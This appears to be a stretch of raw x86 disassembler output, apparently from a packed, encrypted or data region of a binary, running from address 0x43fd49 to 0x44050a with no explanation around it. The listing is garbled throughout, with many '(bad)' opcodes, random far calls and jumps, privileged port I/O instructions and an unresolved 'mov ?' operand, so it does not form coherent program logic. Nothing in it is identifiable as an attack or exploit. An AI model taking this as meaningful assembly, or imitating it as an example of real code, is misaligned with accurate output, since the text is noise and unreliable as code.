  43fd49:	fdiv   QWORD PTR [esi-0x19619b08]
  43fd4f:	mov    DWORD PTR ds:0xdeda4796,ecx
  43fd55:	mov    eax,ds:0xb52a18ed
  43fd5a:	xchg   ecx,eax
  43fd5b:	xchg   esi,eax
  43fd5c:	out    0x2f,al
  43fd5e:	mov    BYTE PTR [edx*2-0x54410d40],bl
  43fd65:	ror    ecx,cl
  43fd67:	cmp    edx,DWORD PTR [ebx-0x4e6de561]
  43fd6d:	push   0xffffffa8
  43fd6f:	data16 ror bl,cl
  43fd72:	test   eax,0xe5c077c7
  43fd77:	dec    edi
  43fd78:	test   BYTE PTR [edx-0x19],bh
  43fd7b:	mov    cs,WORD PTR [esi-0x1a250a87]
  43fd81:	test   DWORD PTR [edx],edx
  43fd83:	mov    esp,DWORD PTR [eax+0x4745ce10]
  43fd89:	fdivrp st(4),st
  43fd8b:	jge    0x43fd68
  43fd8d:	inc    edi
  43fd8e:	xchg   esp,eax
  43fd8f:	ss adc dl,al
  43fd92:	sahf   
  43fd93:	jne    0x43fd2e
  43fd95:	inc    edx
  43fd96:	xchg   edx,eax
  43fd97:	xchg   ebx,eax
  43fd98:	mov    edx,0xe69d60ad
  43fd9d:	imul   esi,DWORD PTR [ebp+0x6d],0x3a
  43fda1:	rcr    DWORD PTR [edx+0x433a707],1
  43fda7:	aam    0xd0
  43fda9:	ficomp DWORD PTR [esi+0x30]
  43fdac:	enter  0x6013,0x8
  43fdb0:	fisttp WORD PTR [ebx]
  43fdb2:	dec    edi
  43fdb3:	call   0x2f2d:0x575b8f30
  43fdba:	push   esp
  43fdbb:	int    0x3c
  43fdbd:	std    
  43fdbe:	aam    0x5a
  43fdc0:	mov    cl,0xce
  43fdc2:	cmp    esi,ecx
  43fdc4:	(bad)  
  43fdc5:	mov    esi,0x5f4b54ef
  43fdca:	pusha  
  43fdcb:	adc    DWORD PTR [edx+0x6b],ecx
  43fdce:	sbb    eax,0xcf5bd783
  43fdd3:	ret    0xde85
  43fdd6:	xchg   ebp,eax
  43fdd7:	mov    bl,0x6e
  43fdd9:	frndint 
  43fddb:	call   0xcb8c:0x7cbdc25c
  43fde2:	sbb    DWORD PTR [edi],esi
  43fde4:	(bad)  
  43fde5:	fucom  st(4)
  43fde7:	mov    eax,0x883d2074
  43fdec:	test   DWORD PTR [ebx],ebp
  43fdee:	stc    
  43fdef:	cmp    cl,BYTE PTR [edi-0x79]
  43fdf2:	mov    ds:0x9fc86c51,al
  43fdf7:	add    DWORD PTR [ebx],0x68b8c9fc
  43fdfd:	nop
  43fdfe:	xor    ch,BYTE PTR [edx+0x50]
  43fe01:	mov    ebx,DWORD PTR [esi]
  43fe03:	in     eax,dx
  43fe04:	sub    ah,BYTE PTR [ebp-0x57]
  43fe07:	mov    dl,0x7c
  43fe09:	pop    ss
  43fe0a:	push   esp
  43fe0b:	lods   eax,DWORD PTR ds:[esi]
  43fe0c:	pop    edx
  43fe0d:	cmp    DWORD PTR [esi-0x14],esi
  43fe10:	fimul  DWORD PTR [ecx]
  43fe12:	jns    0x43fe92
  43fe14:	sub    ah,al
  43fe16:	dec    ebp
  43fe17:	cmp    eax,0x7f137a33
  43fe1c:	mov    ch,0xbf
  43fe1e:	mov    edx,0x5bb95de2
  43fe23:	jge    0x43fe5b
  43fe25:	fcom   DWORD PTR [edi+0x7d5d50e7]
  43fe2b:	cli    
  43fe2c:	retf   0x292d
  43fe2f:	test   eax,esi
  43fe31:	gs jae 0x43fe02
  43fe34:	outs   dx,BYTE PTR ds:[esi]
  43fe35:	test   eax,0xdfb470ad
  43fe3a:	add    al,0xc9
  43fe3c:	xchg   ebp,eax
  43fe3d:	cdq    
  43fe3e:	dec    esp
  43fe3f:	or     bl,BYTE PTR [esi-0x75e4d07e]
  43fe45:	push   ss
  43fe46:	sahf   
  43fe47:	or     cl,BYTE PTR [ebx-0x7e]
  43fe4a:	into   
  43fe4b:	cld    
  43fe4c:	mov    cl,BYTE PTR fs:[ebx+edi*1-0x18]
  43fe51:	call   0x1c17:0x8004b621
  43fe58:	pop    esp
  43fe59:	cmp    ch,cl
  43fe5b:	push   esp
  43fe5c:	out    0x43,eax
  43fe5e:	int3   
  43fe5f:	jo     0x43fedb
  43fe61:	nop
  43fe62:	jne    0x43fdeb
  43fe64:	repnz test eax,0x13e6a143
  43fe6a:	ja     0x43fe76
  43fe6c:	xor    DWORD PTR [eax],ebx
  43fe6e:	push   0xe02fe383
  43fe73:	ins    DWORD PTR es:[edi],dx
  43fe74:	xchg   ebx,eax
  43fe75:	adc    bh,BYTE PTR [esi]
  43fe77:	mov    ds:0x6c05000,al
  43fe7c:	(bad)  
  43fe7d:	xchg   edx,eax
  43fe7e:	inc    ecx
  43fe7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fe80:	xor    eax,0x867a84bd
  43fe85:	and    eax,0x7a3880a2
  43fe8a:	jl     0x43fe6c
  43fe8c:	int    0xfd
  43fe8e:	cmp    al,0xe
  43fe90:	xchg   esi,eax
  43fe91:	repnz ds mov eax,0x58166725
  43fe98:	sti    
  43fe99:	mov    esp,0x16f3b05d
  43fe9e:	add    al,0xb3
  43fea0:	popf   
  43fea1:	rcl    BYTE PTR [edi+0x77],0xc2
  43fea5:	fimul  WORD PTR [esi+0x33c59ee5]
  43feab:	and    ch,ch
  43fead:	icebp  
  43feae:	enter  0xc820,0xa
  43feb2:	lock or ch,BYTE PTR [esi]
  43feb5:	stc    
  43feb6:	jmp    0x43febc
  43feb8:	push   0x6ff4a4d7
  43febd:	cmp    BYTE PTR [edi-0x7d],0x7e
  43fec1:	and    dl,0x2b
  43fec4:	mov    ebp,0xdffab9ed
  43fec9:	push   ebp
  43feca:	xor    BYTE PTR ds:0x5d4f230a,al
  43fed0:	sahf   
  43fed1:	fmul   st(6),st
  43fed3:	mov    cl,0x8c
  43fed5:	leave  
  43fed6:	sub    ah,BYTE PTR [eax-0x3edc0635]
  43fedc:	test   ecx,edx
  43fede:	add    ah,BYTE PTR [edx]
  43fee0:	aas    
  43fee1:	mov    edi,0x9e142c93
  43fee6:	xchg   ecx,eax
  43fee7:	mov    DWORD PTR [edi-0x47d809e3],ecx
  43feed:	(bad)  
  43feee:	fs ss dec ebp
  43fef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fef2:	stc    
  43fef3:	js     0x43ff5f
  43fef5:	icebp  
  43fef6:	stos   BYTE PTR es:[edi],al
  43fef7:	xor    DWORD PTR [eax],edx
  43fef9:	test   BYTE PTR [ebx],cl
  43fefb:	repnz into 
  43fefd:	lds    ecx,FWORD PTR [edx]
  43feff:	mov    al,ds:0xcb886db7
  43ff04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ff05:	fnstsw WORD PTR [edx+0x73]
  43ff08:	lds    esi,FWORD PTR [edi]
  43ff0a:	jbe    0x43fefc
  43ff0c:	or     esp,DWORD PTR [ecx+edi*2-0x7b]
  43ff10:	mov    al,0xa0
  43ff12:	push   eax
  43ff13:	xchg   ebp,eax
  43ff14:	icebp  
  43ff15:	mov    ebp,0x370d0c66
  43ff1a:	int3   
  43ff1b:	sbb    al,0x60
  43ff1d:	mov    bl,0xa1
  43ff1f:	shl    BYTE PTR [eax+eax*4],0x4f
  43ff23:	fcmovu st,st(4)
  43ff25:	mov    ah,cl
  43ff27:	push   esp
  43ff28:	sti    
  43ff29:	in     eax,0xfe
  43ff2b:	mov    dh,0x32
  43ff2d:	cmp    edi,ebx
  43ff2f:	jns    0x43ff71
  43ff31:	mov    al,0xf7
  43ff33:	scas   al,BYTE PTR es:[edi]
  43ff34:	aad    0x61
  43ff36:	fidivr DWORD PTR [edi-0x4a817411]
  43ff3c:	jnp    0x43ff11
  43ff3e:	add    BYTE PTR [esi+0x605f1e01],dh
  43ff44:	or     eax,0x67e9af1d
  43ff49:	adc    al,0x80
  43ff4b:	xchg   bl,ch
  43ff4d:	xchg   DWORD PTR [edx-0x1b0510cf],eax
  43ff53:	adc    esi,esi
  43ff55:	(bad)  
  43ff56:	xchg   ecx,eax
  43ff57:	adc    eax,0x4bfffff5
  43ff5c:	add    ecx,ebp
  43ff5e:	cli    
  43ff5f:	retf   0x42c5
  43ff62:	int3   
  43ff63:	xchg   BYTE PTR [esi],ah
  43ff65:	sub    al,0x6c
  43ff67:	mov    edx,0x4f8e044e
  43ff6c:	sub    DWORD PTR [edi+0x129afb66],edi
  43ff72:	in     eax,0x61
  43ff74:	jmp    0x4978de2f
  43ff79:	loope  0x43ff18
  43ff7b:	scas   eax,DWORD PTR es:[edi]
  43ff7c:	pop    edi
  43ff7d:	hlt    
  43ff7e:	(bad)  
  43ff7f:	loop   0x43ff6c
  43ff81:	mov    eax,0x999ba6b6
  43ff86:	dec    esp
  43ff87:	mov    ebp,0x8f24b178
  43ff8c:	rol    DWORD PTR [eax],0xfb
  43ff8f:	mov    eax,0xff5021a2
  43ff94:	not    DWORD PTR [ecx+0x51d45bdc]
  43ff9a:	push   ss
  43ff9b:	fistp  DWORD PTR [ebp-0x94a835]
  43ffa1:	xor    bh,BYTE PTR [edi]
  43ffa3:	push   ebp
  43ffa4:	xchg   ecx,eax
  43ffa5:	push   0xb98086dc
  43ffaa:	pop    esi
  43ffab:	lods   eax,DWORD PTR ds:[esi]
  43ffac:	cdq    
  43ffad:	enter  0xd4a2,0xe1
  43ffb1:	sbb    eax,0x28ab5abb
  43ffb6:	push   0x69
  43ffb8:	cmp    dl,dh
  43ffba:	cmp    ah,BYTE PTR [esi+ecx*4-0x4b]
  43ffbe:	push   0x63368593
  43ffc3:	enter  0xf328,0x51
  43ffc7:	jno    0x44002f
  43ffc9:	ins    BYTE PTR es:[edi],dx
  43ffca:	fcmove st,st(0)
  43ffcc:	out    dx,eax
  43ffcd:	xchg   ebp,esp
  43ffcf:	icebp  
  43ffd0:	scas   al,BYTE PTR es:[edi]
  43ffd1:	arpl   bx,bp
  43ffd3:	adc    bl,BYTE PTR [edi+0x288988eb]
  43ffd9:	(bad)  
  43ffda:	call   0xa27f:0x504eedae
  43ffe1:	push   DWORD PTR [edi-0x19d11325]
  43ffe7:	add    DWORD PTR [eax-0x4c3fb324],ebp
  43ffed:	xor    al,0xb4
  43ffef:	push   esp
  43fff0:	push   ebx
  43fff1:	leave  
  43fff2:	jmp    0x826a:0x93f109b3
  43fff9:	and    DWORD PTR [ebx-0x11],esi
  43fffc:	fadd   st(4),st
  43fffe:	repnz push eax
  440000:	arpl   WORD PTR [edx+ebp*1],bp
  440003:	fist   WORD PTR [edx-0x31]
  440006:	bound  ebx,QWORD PTR [ebx+0x6d]
  440009:	cli    
  44000a:	and    eax,0x8cea538b
  44000f:	and    al,0x7a
  440011:	adc    ecx,DWORD PTR [edi-0xd4c7438]
  440017:	(bad)  
  440018:	mov    eax,0x30a95a12
  44001d:	add    BYTE PTR [eax+0x15aeffc2],ah
  440023:	inc    esi
  440024:	mov    dl,0xf3
  440026:	rcl    BYTE PTR [edi],0x81
  440029:	xchg   edi,eax
  44002a:	mov    esp,0x7450b8d1
  44002f:	add    BYTE PTR [esi-0x33843253],cl
  440035:	out    dx,al
  440036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440037:	(bad)  
  440038:	ins    BYTE PTR es:[edi],dx
  440039:	fbstp  TBYTE PTR [esi+0x58]
  44003c:	jae    0x440046
  44003e:	arpl   WORD PTR [ebp-0x213bd209],sp
  440044:	aas    
  440045:	add    esp,ebx
  440047:	xchg   edx,ebp
  440049:	pop    ebp
  44004a:	dec    edx
  44004b:	in     eax,dx
  44004c:	icebp  
  44004d:	addr16 cmc 
  44004f:	xor    DWORD PTR [edi+0xd],0xa8367372
  440056:	or     al,0x4b
  440058:	xor    edx,0x59
  44005b:	mov    dl,0x61
  44005d:	rcl    DWORD PTR [eax-0x37],0x63
  440061:	mov    ds:0x8554b38d,eax
  440066:	and    eax,0xe38c8307
  44006b:	push   0xffffffe3
  44006d:	inc    ebx
  44006e:	in     eax,dx
  44006f:	cs and al,0x4b
  440072:	pop    edx
  440073:	mov    ?,WORD PTR [ecx+0x10e7bacd]
  440079:	sub    ecx,DWORD PTR [edx+0x2eae8c4]
  44007f:	out    0xf5,eax
  440081:	sbb    esp,eax
  440083:	std    
  440084:	ja     0x44000f
  440086:	cmc    
  440087:	add    BYTE PTR [edx-0x7e1745b1],dl
  44008d:	xlat   BYTE PTR ds:[ebx]
  44008e:	pop    edi
  44008f:	leave  
  440090:	cmp    BYTE PTR [edi],al
  440092:	sub    DWORD PTR [ebx+0x71],0x32
  440096:	and    ebx,ecx
  440098:	pushf  
  440099:	jle    0x4400f9
  44009b:	hlt    
  44009c:	or     dh,BYTE PTR [eax+0x1f]
  44009f:	enter  0xcdbd,0x18
  4400a3:	pop    esi
  4400a4:	ror    BYTE PTR ds:0x21b4c90e,cl
  4400aa:	nop
  4400ab:	and    al,0xe0
  4400ad:	out    0xa5,eax
  4400af:	xor    eax,0xe387bd71
  4400b4:	into   
  4400b5:	scas   al,BYTE PTR es:[edi]
  4400b6:	test   al,0x8b
  4400b8:	shr    DWORD PTR [eax],0xc3
  4400bb:	shl    esi,1
  4400bd:	cwde   
  4400be:	inc    edi
  4400bf:	add    cl,dh
  4400c1:	(bad)  
  4400c2:	retf   
  4400c3:	test   BYTE PTR [esi-0x3d],dl
  4400c6:	leave  
  4400c7:	push   ecx
  4400c8:	call   0x8c46:0xc3d88bb9
  4400cf:	xlat   BYTE PTR ds:[ebx]
  4400d0:	dec    ecx
  4400d1:	jbe    0x4400fe
  4400d3:	push   ebp
  4400d4:	push   0x767ee8b7
  4400d9:	adc    eax,0x7dd181b3
  4400de:	mov    eax,0x4120b9cb
  4400e3:	out    0x8e,eax
  4400e5:	aaa    
  4400e6:	cli    
  4400e7:	push   cs
  4400e8:	cmp    al,0x25
  4400ea:	arpl   WORD PTR [ebx],bx
  4400ec:	sub    BYTE PTR [eax+0x37],dh
  4400ef:	add    al,0xf6
  4400f1:	daa    
  4400f2:	fdiv   DWORD PTR [ebx]
  4400f4:	adc    ch,BYTE PTR [eax]
  4400f6:	icebp  
  4400f7:	add    BYTE PTR [ecx-0x41f4448f],bl
  4400fd:	leave  
  4400fe:	int    0x89
  440100:	(bad)  
  440101:	jno    0x44010d
  440103:	mov    eax,cs:0xd3b5eccb
  440109:	in     eax,dx
  44010a:	xchg   BYTE PTR [ecx-0xdca1003],al
  440110:	data16 mul BYTE PTR [edx-0x46d12574]
  440117:	jb     0x4400e9
  440119:	cmp    DWORD PTR [edi],esi
  44011b:	dec    esi
  44011c:	scas   al,BYTE PTR es:[edi]
  44011d:	cmp    bh,BYTE PTR [ecx+0x11]
  440120:	pop    edi
  440121:	dec    esi
  440122:	fadd   st(3),st
  440124:	not    DWORD PTR [eax]
  440126:	test   eax,0xfb0df42a
  44012b:	fs push es
  44012d:	and    DWORD PTR [edi+0x73f1d1ef],edx
  440133:	je     0x44016e
  440135:	push   ss
  440136:	loop   0x4400d5
  440138:	ins    DWORD PTR es:[edi],dx
  440139:	xchg   DWORD PTR [esi],edx
  44013b:	xchg   esi,eax
  44013c:	mov    dh,0xc3
  44013e:	sub    al,BYTE PTR [edx+0x30]
  440141:	jmp    0x31506255
  440146:	aas    
  440147:	jge    0x4401c5
  440149:	push   eax
  44014a:	dec    ebp
  44014b:	int3   
  44014c:	mov    cl,0xa6
  44014e:	cmc    
  44014f:	sar    BYTE PTR [edx-0x10],1
  440152:	shl    DWORD PTR [ecx],cl
  440154:	inc    eax
  440155:	fst    QWORD PTR [edx+0x73]
  440158:	out    0x27,eax
  44015a:	aaa    
  44015b:	fild   DWORD PTR [ecx]
  44015d:	inc    edi
  44015e:	xor    al,0x85
  440160:	test   al,0x56
  440162:	dec    edx
  440163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440164:	jno    0x4401b0
  440166:	mov    ch,0x26
  440168:	cmp    BYTE PTR [edx-0x26],ch
  44016b:	mov    al,0x37
  44016d:	push   edi
  44016e:	ja     0x44011f
  440170:	adc    eax,0x46c9bd52
  440175:	jecxz  0x44011d
  440177:	cwde   
  440178:	out    0xc2,eax
  44017a:	fwait
  44017b:	or     al,0x79
  44017d:	xor    eax,ebx
  44017f:	add    ebx,edi
  440181:	jmp    0x8de2:0xeedef50f
  440188:	jae    0x4401d5
  44018a:	xlat   BYTE PTR ds:[ebx]
  44018b:	xor    ecx,DWORD PTR ds:0xde282086
  440191:	scas   al,BYTE PTR es:[edi]
  440192:	and    DWORD PTR [eax+0x58703c70],ecx
  440198:	or     ebp,eax
  44019a:	sub    eax,DWORD PTR [eax+0x20]
  44019d:	xchg   ebp,eax
  44019e:	lods   eax,DWORD PTR ds:[esi]
  44019f:	int3   
  4401a0:	popf   
  4401a1:	sar    esi,0xc2
  4401a4:	adc    BYTE PTR ss:[ebx],cl
  4401a7:	shl    DWORD PTR [ecx],0x1
  4401aa:	mov    dh,0xb3
  4401ac:	and    esi,DWORD PTR [ecx]
  4401ae:	pushf  
  4401af:	addr16 mov fs,esi
  4401b2:	shl    BYTE PTR [ebx],0x96
  4401b5:	(bad)  
  4401b6:	jo     0x4401fd
  4401b8:	or     edx,eax
  4401ba:	and    dh,BYTE PTR [ebp+0x7c52ea5d]
  4401c0:	pop    ecx
  4401c1:	pop    esi
  4401c2:	cmp    bh,al
  4401c4:	jle    0x440148
  4401c6:	jno    0x440233
  4401c8:	cmp    bl,dl
  4401ca:	lahf   
  4401cb:	out    0x98,al
  4401cd:	mov    dl,0xc8
  4401cf:	dec    eax
  4401d0:	dec    ebp
  4401d1:	pusha  
  4401d2:	out    dx,al
  4401d3:	fwait
  4401d4:	ror    BYTE PTR [ebp+0x35],0xab
  4401d8:	das    
  4401d9:	or     BYTE PTR [eax-0x6c],0x7d
  4401dd:	add    DWORD PTR [edi],0xffffffc0
  4401e0:	in     al,dx
  4401e1:	push   esi
  4401e2:	inc    si
  4401e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4401e5:	xchg   ebp,eax
  4401e6:	test   DWORD PTR [ecx+0x26],ebp
  4401e9:	aas    
  4401ea:	ror    BYTE PTR [edx-0x6],1
  4401ed:	push   esi
  4401ee:	stc    
  4401ef:	popa   
  4401f0:	dec    ecx
  4401f1:	push   0x988e8875
  4401f6:	push   ds
  4401f7:	(bad)
  4401fa:	lods   eax,DWORD PTR ds:[esi]
  4401fb:	mov    al,0x9c
  4401fd:	lds    esi,FWORD PTR [edi+0x3d0a257f]
  440203:	imul   edx,DWORD PTR [edi+edx*2+0x698bf0d0],0xffffffd4
  44020b:	nop
  44020c:	test   eax,0xdd60a40e
  440211:	repnz add dl,cl
  440214:	and    BYTE PTR [edi+0x3e],0xb1
  440218:	jnp    0x4401b4
  44021a:	jmp    0x4401ab
  44021c:	mov    BYTE PTR [eax],dh
  44021e:	adc    edx,ebp
  440220:	add    eax,0x4f2a5421
  440225:	(bad)  
  440226:	dec    eax
  440227:	fistp  WORD PTR [esi+0x57541abe]
  44022d:	or     al,BYTE PTR [eax-0x33]
  440230:	das    
  440231:	loop   0x440228
  440233:	out    0xc7,eax
  440235:	lock xchg DWORD PTR [esp+eiz*8+0x2a],ebx
  44023a:	mov    al,ds:0xc5dcaabe
  44023f:	repnz mov esi,0xc18d8b19
  440245:	inc    esi
  440246:	xor    eax,0x97a00157
  44024b:	imul   edi,edi,0x79d0a89e
  440251:	(bad)  
  440252:	cmc    
  440253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440254:	adc    DWORD PTR [esi+0x5f],ebx
  440257:	fcom   DWORD PTR [eax]
  440259:	jo     0x44023b
  44025b:	jp     0x4401eb
  44025d:	in     al,dx
  44025e:	adc    DWORD PTR [ebx],esi
  440260:	in     al,dx
  440261:	into   
  440262:	pop    ebx
  440263:	or     BYTE PTR [edi],0x25
  440266:	sbb    DWORD PTR [eax-0x80],esp
  440269:	lods   al,BYTE PTR ds:[esi]
  44026a:	aam    0xab
  44026c:	imul   esi,DWORD PTR [ebx],0xffffffb1
  44026f:	jg     0x440252
  440271:	pop    es
  440272:	or     DWORD PTR [eax+0x4c],esi
  440275:	push   0x33b3231a
  44027a:	rol    eax,0x50
  44027d:	stos   BYTE PTR es:[edi],al
  44027e:	lods   eax,DWORD PTR ds:[esi]
  44027f:	lock mov ds:0xe07e4c80,eax
  440285:	mov    ds:0xce6a1cdf,eax
  44028a:	xor    ah,BYTE PTR [esi+0x25]
  44028d:	jbe    0x44021c
  44028f:	inc    ebx
  440290:	push   edi
  440291:	adc    ah,BYTE PTR [edi+eax*8-0x458b9fab]
  440298:	adc    eax,0x66808610
  44029d:	mov    ds:0xe9cfbc56,al
  4402a2:	rol    DWORD PTR [ecx],cl
  4402a4:	inc    edi
  4402a5:	ret    0xd46d
  4402a8:	repz mov al,0xe1
  4402ab:	int3   
  4402ac:	adc    esp,esp
  4402ae:	aad    0x68
  4402b0:	mov    eax,ds:0x21333b07
  4402b5:	stos   BYTE PTR es:[edi],al
  4402b6:	jbe    0x44026d
  4402b8:	mov    ebp,0xebf3c0e2
  4402bd:	pusha  
  4402be:	icebp  
  4402bf:	gs ret 
  4402c1:	ror    BYTE PTR [ecx-0x3aa38757],1
  4402c7:	push   cs
  4402c8:	mov    dh,0xbd
  4402ca:	(bad)  
  4402cc:	lock sub dl,BYTE PTR [ebx-0x2b]
  4402d0:	adc    cl,dh
  4402d2:	ins    DWORD PTR es:[edi],dx
  4402d3:	gs xor eax,0x62b63cfb
  4402d9:	xchg   esp,eax
  4402da:	mov    eax,0xd220dc8a
  4402df:	or     BYTE PTR [edx-0x56],al
  4402e2:	and    bh,BYTE PTR [ebp+0x73]
  4402e5:	or     DWORD PTR [ecx+0x62c50f6f],ebp
  4402eb:	test   al,0x9b
  4402ed:	scas   al,BYTE PTR es:[edi]
  4402ee:	mov    eax,0x59f2128
  4402f3:	jnp    0x440326
  4402f5:	pusha  
  4402f6:	inc    ebp
  4402f7:	cmp    BYTE PTR es:[ebx],0x51
  4402fb:	jp     0x44033a
  4402fd:	dec    esp
  4402fe:	inc    esp
  4402ff:	add    dh,BYTE PTR [edx-0x1c239c1f]
  440305:	sub    edx,DWORD PTR [ebx-0x77]
  440308:	loop   0x4402b3
  44030a:	cmp    dl,BYTE PTR [eax]
  44030c:	xor    dh,BYTE PTR [ecx+edx*4+0x255e84b]
  440313:	daa    
  440314:	jbe    0x4402c1
  440316:	sbb    al,0x49
  440318:	mov    ds:0xdf8489a,al
  44031d:	xor    eax,0xd9dca1bf
  440322:	adc    al,0x7d
  440324:	jp     0x44039d
  440326:	aas    
  440327:	xchg   edx,eax
  440328:	or     al,0xd1
  44032a:	ins    BYTE PTR es:[edi],dx
  44032b:	dec    ebp
  44032c:	in     eax,0xfb
  44032e:	icebp  
  44032f:	jmp    0x2fe5686f
  440334:	fdivr  st,st(0)
  440336:	out    0xef,eax
  440338:	rcl    DWORD PTR [esi+eax*1+0x7475492e],cl
  44033f:	daa    
  440340:	xchg   esi,eax
  440341:	sub    al,0xfc
  440343:	jmp    0xab331223
  440348:	xchg   esp,eax
  440349:	inc    edi
  44034a:	sti    
  44034b:	jp     0x44037a
  44034d:	cwde   
  44034e:	cwde   
  44034f:	sti    
  440350:	js     0x4403b6
  440352:	push   es
  440353:	pop    ecx
  440354:	adc    DWORD PTR [edi-0x73f3bab1],edx
  44035a:	xchg   edi,eax
  44035b:	es pop esi
  44035d:	fisubr WORD PTR [bx+si]
  440360:	int    0xc9
  440362:	jno    0x44039a
  440364:	test   cl,0x3a
  440367:	stos   BYTE PTR es:[edi],al
  440368:	ret    
  440369:	ja     0x44033b
  44036b:	mov    eax,ds:0xf28f1651
  440370:	and    ebp,ebx
  440372:	(bad)  
  440373:	dec    ebp
  440374:	mov    esp,0x1ec8f02c
  440379:	mov    ebx,0x1bd617a1
  44037e:	cmp    bh,BYTE PTR [esi-0x57]
  440381:	mov    cl,0x5a
  440383:	add    eax,DWORD PTR [esi+ebp*2]
  440386:	es pusha 
  440388:	xchg   edi,ebp
  44038a:	outs   dx,BYTE PTR ds:[esi]
  44038b:	push   ss
  44038c:	inc    eax
  44038d:	push   cs
  44038e:	jl     0x4403cb
  440390:	push   0x4b
  440392:	mov    dh,0xac
  440394:	es jns 0x440349
  440397:	and    bl,dl
  440399:	outs   dx,DWORD PTR ds:[esi]
  44039a:	xor    ah,bh
  44039c:	dec    edi
  44039d:	mov    ebx,DWORD PTR [ecx]
  44039f:	cld    
  4403a0:	(bad)  
  4403a3:	(bad)  
  4403a4:	cmc    
  4403a5:	sahf   
  4403a6:	and    al,0x53
  4403a8:	sub    BYTE PTR [eax-0x71cd746c],dl
  4403ae:	neg    BYTE PTR [esi+0x71]
  4403b1:	xchg   edx,eax
  4403b2:	pusha  
  4403b3:	cmp    eax,edi
  4403b5:	cdq    
  4403b6:	jo     0x44035b
  4403b8:	retf   
  4403b9:	shl    DWORD PTR [eax],cl
  4403bb:	push   esi
  4403bc:	scas   eax,DWORD PTR es:[edi]
  4403bd:	jbe    0x440408
  4403bf:	adc    DWORD PTR [edx-0x2a6669fe],0x62cd0062
  4403c9:	call   0x40ca:0x8fadafe8
  4403d0:	mov    esp,0xbdc6a341
  4403d5:	cmp    al,0x52
  4403d7:	or     al,BYTE PTR [ebp+0x35]
  4403da:	pop    eax
  4403db:	lea    ecx,[edi-0x4ab91d5e]
  4403e1:	cmp    ebx,DWORD PTR [esi-0x10ae5b2c]
  4403e7:	cmp    eax,0x944a49b6
  4403ec:	mov    edx,0x354fbd14
  4403f1:	iret   
  4403f2:	jge    0x4403e3
  4403f4:	sbb    eax,0x4065127c
  4403f9:	rcr    BYTE PTR [ebx+0x63],1
  4403fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4403fd:	cmp    DWORD PTR ds:0xdb8af000,esp
  440403:	sub    bh,al
  440405:	pop    esi
  440406:	jno    0x44047e
  440408:	iret   
  440409:	std    
  44040a:	imul   edi,DWORD PTR [ebp-0x1ff09842],0x7bb8f600
  440414:	xchg   ebp,eax
  440415:	adc    eax,0x571d92b2
  44041a:	adc    dl,BYTE PTR [esi]
  44041c:	pushf  
  44041d:	cmp    eax,0xbc688c95
  440422:	mov    ds:0xb45e7777,al
  440427:	push   edx
  440428:	aaa    
  440429:	ret    0x952
  44042c:	test   cl,bh
  44042e:	in     al,dx
  44042f:	cli    
  440430:	jb     0x440487
  440432:	or     edi,DWORD PTR [ecx-0xe05399d]
  440438:	add    edi,DWORD PTR [eax+eax*1+0x7d]
  44043c:	fs pop edi
  44043e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44043f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440440:	outs   dx,DWORD PTR es:[esi]
  440442:	sub    eax,0x9a9bc9a
  440447:	cmp    DWORD PTR [edi+0x3257a53b],esp
  44044d:	sub    ch,ah
  44044f:	retf   
  440450:	or     ah,BYTE PTR [edi+edx*2+0x5355c89d]
  440457:	mov    bl,dh
  440459:	loopne 0x440463
  44045b:	add    eax,0x38b926b8
  440460:	call   0x4fdd0d8c
  440465:	jp     0x440443
  440467:	push   cs
  440468:	inc    esp
  440469:	jb     0x440400
  44046b:	call   0xd301:0x36d6752e
  440472:	out    0xd8,al
  440474:	shl    BYTE PTR [esi+esi*2],0x3b
  440478:	and    BYTE PTR [ebp+eiz*1-0x72],0xb0
  44047d:	jns    0x4404aa
  44047f:	outs   dx,BYTE PTR ds:[esi]
  440480:	push   ss
  440481:	test   BYTE PTR [edx],dl
  440483:	inc    esp
  440484:	mov    dh,0xf3
  440486:	jns    0x440447
  440488:	fiadd  DWORD PTR [eax+0x17df8932]
  44048e:	cwde   
  44048f:	js     0x440490
  440491:	fdiv   st(2),st
  440493:	stc    
  440494:	pop    eax
  440495:	push   ebp
  440496:	data16 fist DWORD PTR [esi+esi*4-0x80235bc]
  44049e:	jne    0x4404df
  4404a0:	adc    ebx,ecx
  4404a2:	jo     0x4404b6
  4404a4:	and    BYTE PTR [ecx+0x26],dl
  4404a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4404a8:	cmp    eax,0x64e57537
  4404ad:	bound  ecx,QWORD PTR [ebp+0x68]
  4404b0:	scas   al,BYTE PTR es:[edi]
  4404b1:	sub    ah,ch
  4404b3:	aam    0x61
  4404b5:	pushf  
  4404b6:	jmp    0x440505
  4404b8:	jno    0x44044d
  4404ba:	jb     0x4404ef
  4404bc:	iret   
  4404bd:	addr16 cmc 
  4404bf:	shl    BYTE PTR [ebx-0x51f5575],1
  4404c5:	mov    eax,ds:0xd0e279ce
  4404ca:	out    0x3a,eax
  4404cc:	jmp    0xe9c1a14d
  4404d1:	sub    DWORD PTR [ecx+0x5202591f],ecx
  4404d7:	push   ss
  4404d8:	push   0xffffffa0
  4404da:	(bad)  
  4404db:	push   ds
  4404dc:	sub    ecx,DWORD PTR [eax]
  4404de:	int3   
  4404df:	into   
  4404e0:	adc    ebp,DWORD PTR [edi+edx*8+0x40]
  4404e4:	or     al,0x6
  4404e6:	imul   esp,DWORD PTR [ecx],0x22f12413
  4404ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4404ed:	hlt    
  4404ee:	xchg   ebx,eax
  4404ef:	dec    esp
  4404f0:	ins    BYTE PTR es:[edi],dx
  4404f1:	sub    dl,al
  4404f3:	jbe    0x44053f
  4404f5:	lahf   
  4404f6:	in     eax,0x4e
  4404f8:	sub    BYTE PTR [ebx+0x23],bh
  4404fb:	sbb    eax,0x529c6e2a
  440500:	push   ebp
  440501:	sub    eax,0x358d7016
  440506:	fisubr DWORD PTR fs:[edi]
  440509:	daa    
  44050a:	sbb    DWORD PTR [esi-0x3f],esp
